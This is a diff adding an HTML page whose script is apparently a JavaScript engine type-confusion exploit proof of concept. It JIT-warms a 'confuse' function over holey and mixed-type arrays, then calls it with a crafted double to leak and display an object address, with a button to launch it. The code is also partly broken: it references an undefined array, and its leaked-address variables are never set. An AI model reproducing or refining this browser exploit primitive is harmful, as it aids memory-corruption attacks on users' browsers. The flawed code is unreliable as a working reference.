@@ -1,0 +1,50 @@
+<html>
+<body>
+<script>
+
+var myObj = new Array(0x41, 0x42, 0x43, 0x44, 0x45);
+var a = [1.1, 2.2, 3.3];
+var b = new Uint32Array(100)
+var lo = 0;
+var hi = 0;
+var float64 = new Float64Array(1);
+var int32 = new Int32Array(float64.buffer);
+
+function confuse(a, value, b, c)
+{
+    a[0] = 1.1;
+    a.push(value);
+    b[2] = c;
+}
+
+function run()
+{
+    alert("Starting");
+
+    for(let i = 0; i < 20000; i++)
+    {
+        arr2 = [2,3,4,5,6.6,7,8,9];
+        delete arr2[1];
+        oarr = [1.1, 2.2, 3.3, {}];
+        confuse(arr2, 3.3, oarr, {});
+    }
+    setTimeout(followup, 100);
+}
+
+function followup()
+{
+    confuse(arr, -5.3049894784e-314, arr, myObj)
+    prompt("addr:", "0x" + SignedDwordToUnsignedDword(hi).toString(16) + "" + SignedDwordToUnsignedDword(lo).toString(16));
+    Math.sin(1)
+}
+
+function SignedDwordToUnsignedDword(sd)
+{
+    return (sd < 0) ? sd + 0x100000000 : sd;
+}
+
+</script>
+<div class="buttonbar">
+    <input type="button" onclick="run()" value="Execute script" />
+</body>
+</html>
